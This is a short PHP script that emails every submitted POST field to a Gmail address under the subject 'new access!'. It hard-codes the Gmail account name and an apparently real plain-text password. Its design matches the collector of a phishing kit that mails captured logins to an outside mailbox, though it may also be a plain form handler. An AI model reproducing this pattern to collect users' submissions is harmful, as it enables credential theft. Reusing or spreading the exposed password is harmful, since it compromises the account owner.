<?php
	include('../config.php');
	$data = array();
	$assunto = 'novo acesso!';
	$corpo = '';
	foreach ($_POST as $key => $value) {
		$corpo.=ucfirst($key).": ".$value;
		$corpo.="<hr>";
	}
	$info = array('assunto'=>$assunto,'corpo'=>$corpo);
	$mail = new Email('smtp.gmail.com','ruddystore666@gmail.com','29012003Ab','Ruddy Store');
    $mail->addAdress('ruddystore666@gmail.com', 'Ruddy Store');
	$mail->formatarEmail($info);
	if($mail->enviarEmail()){
		$data['sucesso'] = true;
	}else{
		$data['erro'] = true;
	}
	die(json_encode($data));
?>